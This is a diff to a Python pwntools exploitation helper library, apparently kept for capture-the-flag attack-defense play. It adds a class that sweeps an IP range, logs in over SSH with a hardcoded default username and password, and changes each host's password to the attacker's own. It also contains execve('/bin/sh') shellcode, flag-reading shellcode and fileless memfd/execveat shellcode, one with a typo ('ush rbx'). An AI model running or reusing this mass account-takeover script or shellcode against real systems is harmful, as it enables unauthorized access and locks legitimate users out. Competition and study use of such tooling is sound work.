@@ -179,6 +179,57 @@ class IPLIST:
             return result
         self.result=iplist(ip)
 
+# from multiprocessing import Pool
+class FUCKPASSWD:
+    """docstring for FUCKPASSWD
+    attack=FUCKPASSWD("172.192.168.14-18-2",timeout=2)
+    attack.exploit()
+    """
+    def __init__(self, ip="192.168.111.14-18-2", port=22,user='wongyohoo', passwd="cz19990403", mypasswd='qazxswedc',timeout=None):
+        if timeout:
+            context(log_level='debug',timeout=timeout)
+        # 如果知道其他的username和passwd, 批量修改!
+
+        # ------------------ config ---------------------
+        self.PORT=port
+        self.USER=user
+        self.PASSWD=passwd
+        self.IP_RANGE=ip
+        self.MY_PASSWD=mypasswd
+        # ------------------ config ---------------------
+
+    def fuck(self,ip):
+        command=r"echo -e '"+self.PASSWD+r"\n"+self.MY_PASSWD+r"\n"+self.MY_PASSWD+r"""\n' | passwd """+self.USER+"\n"
+        while True:
+            r=None
+            try:
+                r = ssh(host=ip,port=self.PORT, user=self.USER, password=self.PASSWD,level=0)
+                r.run(command)
+                success("SUCCESS: "+ip)
+            except Exception as e:
+                info("Error: "+ip)
+                break
+                # continue
+            finally:
+                if r:
+                    r.close()
+
+    def exploit(self):
+        ip_pool=IPLIST(self.IP_RANGE).result
+        print(ip_pool)
+        while True:
+            for i in ip_pool:
+                try:
+                    self.fuck(i)
+                except Exception:
+                    continue
+
+        # ps=Pool(20)
+        # for i in ip_pool:
+        #     ps.apply_async(fuck,args=(i,))
+        # ps.close()
+        # ps.join()
+
 def pack_file32(
         _flags = 0,
         _IO_read_ptr = 0,
@@ -375,50 +426,50 @@ def gadget2(addr):
 
 def execve(is32=False,multi_arch=0):
     multi="""
-    xor esi, esi                  
-    mul esi                       
-    push rdx                        
-    push rdx                        
-    push rdx                        
-    push rsp                       
-    pop rbx                         
-    ush rbx                        
-    pop rdi                         
-    mov dword [rdi], 0x6e69622f     
-    mov dword [rdi+0x4], 0x68732f2f 
-    jnz 0x1f                        
-    mov al, 0x3b                  
-    syscall                         
-    xor ecx, ecx                   
-    mov al, 0xb                     
-    int 0x80      
-    """
+xor esi, esi                  
+mul esi                       
+push rdx                        
+push rdx                        
+push rdx                        
+push rsp                       
+pop rbx                         
+ush rbx                        
+pop rdi                         
+mov dword [rdi], 0x6e69622f     
+mov dword [rdi+0x4], 0x68732f2f 
+jnz 0x1f                        
+mov al, 0x3b                  
+syscall                         
+xor ecx, ecx                   
+mov al, 0xb                     
+int 0x80      
+"""
     if multi_arch:
         return asm(multi,arch="amd64")
     # 20byte         
     code32="""
-    xor    ecx,ecx
-    push   0xb
-    pop    eax
-    push   ecx
-    push   0x68732f2f
-    push   0x6e69622f
-    mov    ebx,esp
-    int    0x80
-    """
+xor    ecx,ecx
+push   0xb
+pop    eax
+push   ecx
+push   0x68732f2f
+push   0x6e69622f
+mov    ebx,esp
+int    0x80
+"""
     shellcode_sh_i386=asm(code32,arch="i386")
     # 22byte
     code64="""
-    xor 	rsi,	rsi			
-    push rsi
-    mov 	rdi,	0x68732f2f6e69622f
-    push rdi
-    push rsp
-    pop rdi
-    mov al,0x3b
-    cdq
-    syscall
-    """
+xor 	rsi,	rsi			
+push rsi
+mov 	rdi,	0x68732f2f6e69622f
+push rdi
+push rsp
+pop rdi
+mov al,0x3b
+cdq
+syscall
+"""
     shellcode_sh_x64=asm(code64,arch="amd64")
     if is32:
         return shellcode_sh_i386
@@ -429,88 +480,88 @@ def readflag(is32=False):
     # 可以将所有的mov指令转换为push pop减小shellcode大小
     if is32:
         code = """
-        xor ecx,ecx
-        mov eax,SYS_open
-        call here
-        .string "./flag"
-        .byte 0
-        here:
-        pop ebx
-        int 0x80
-        mov ebx,eax
-        mov ecx,esp
-        mov edx,0x100
-        mov eax,SYS_read
-        int 0x80
-        mov ebx,1
-        mov ecx,esp
-        mov edx,0x100
-        mov eax,SYS_write
-        int 0x80
-        mov eax,SYS_exit
-        int 0x80
-        """
+xor ecx,ecx
+mov eax,SYS_open
+call here
+.string "./flag"
+.byte 0
+here:
+pop ebx
+int 0x80
+mov ebx,eax
+mov ecx,esp
+mov edx,0x100
+mov eax,SYS_read
+int 0x80
+mov ebx,1
+mov ecx,esp
+mov edx,0x100
+mov eax,SYS_write
+int 0x80
+mov eax,SYS_exit
+int 0x80
+"""
         # 65
         return asm(code,arch="i386")
     else:
         code = """
-        xor rsi,rsi
-        mov rax,SYS_open
-        call here
-        .string "/flag"
-        here:
-        pop rdi
-        syscall
-        mov rdi,rax
-        mov rsi,rsp
-        mov rdx,0x100
-        mov rax,SYS_read
-        syscall
-        mov rdi,1
-        mov rsi,rsp
-        mov rdx,0x100
-        mov rax,SYS_write
-        syscall
-        mov rax,SYS_exit
-        syscall
-        """
+xor rsi,rsi
+mov rax,SYS_open
+call here
+.string "/flag"
+here:
+pop rdi
+syscall
+mov rdi,rax
+mov rsi,rsp
+mov rdx,0x100
+mov rax,SYS_read
+syscall
+mov rdi,1
+mov rsi,rsp
+mov rdx,0x100
+mov rax,SYS_write
+syscall
+mov rax,SYS_exit
+syscall
+"""
         return asm(code,arch="amd64")
 
 
 def execveat():
     # 这个shellcode从文件读取输入,无文件执行从stdin输入到内存的文件
     code=shellcraft.pushstr("Q4n")+"""
-    mov rax,319
-    mov rdi,rsp
-    xor rsi,rsi
-    syscall
-    mov rbx,rax
-    loop:
-    xor rdi.rdi
-    mov rsi,rsp
-    mov rdx,0x400
-    xor rax.rax
-    syscall
-    cmp rax,0
-    je go
-    mov rdi,rbx
-    mov rsi,rsp
-    mov rdx,rax
-    xor rax,rax
-    inc rax
+mov rax,319
+mov rdi,rsp
+xor rsi,rsi
+syscall
+mov rbx,rax
+loop:
+xor rdi.rdi
+mov rsi,rsp
+mov rdx,0x400
+xor rax.rax
+syscall
+cmp rax,0
+je go
+mov rdi,rbx
+mov rsi,rsp
+mov rdx,rax
+xor rax,rax
+inc rax
 
-    syscall
-    jmp loop
-    go:
-    mov rdi,rbx
-    push 0
-    mov rsi,rsp
-    xor rdx,rdx
-    xor r10,r10
-    mov r8,0x1000
-    mov rax,322
-    syscall
-    """
+syscall
+jmp loop
+go:
+mov rdi,rbx
+push 0
+mov rsi,rsp
+xor rdx,rdx
+xor r10,r10
+mov r8,0x1000
+mov rax,322
+syscall
+"""
     return asm(code,arch="amd64")
 
 
@@ -540,3 +591,4 @@ def dlresolve(bin_path):
     # buf += rop.dl_resolve_data(bss_base + 20, 'system')
     # buf += rop.fill(100, buf)
     # r.send(buf)
+
